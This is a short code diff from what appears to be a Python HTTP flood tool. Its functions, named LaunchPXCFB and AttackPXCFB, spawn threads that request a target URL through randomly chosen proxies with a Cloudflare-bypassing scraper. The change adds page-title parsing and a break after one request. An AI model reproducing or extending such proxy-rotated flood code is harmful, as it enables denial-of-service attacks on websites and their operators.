@@ -565,8 +565,6 @@ def LaunchPXCFB(url, th, t):
                 proxy = random.choice(proxies).strip().split(":")
                 thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper,proxy,th))
                 thd.start()
-               
-
             except:
                 print('teo--------------',proxy)
                 pass
@@ -586,8 +584,17 @@ def AttackPXCFB(url, until_datetime, scraper,proxy,th):
                 }
 
                 response = scraper.get(url,headers=headers, proxies=proxies)
+                if response.status_code == 200:
+                    # Parse the webpage content
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    
+                    # Find the title tag and get its text
+                    title = soup.title.string
+                    print(f"Title of the webpage: {title}")
+                else:
+                    print(f"Failed to retrieve the webpage. Status code: {response.status_code}")
                 # response = scraper.get(url,headers=headers)
-                print('Page status:',  response.status_code)
+                break
         except Exception as e:
             print('falid--------------',e)
             pass
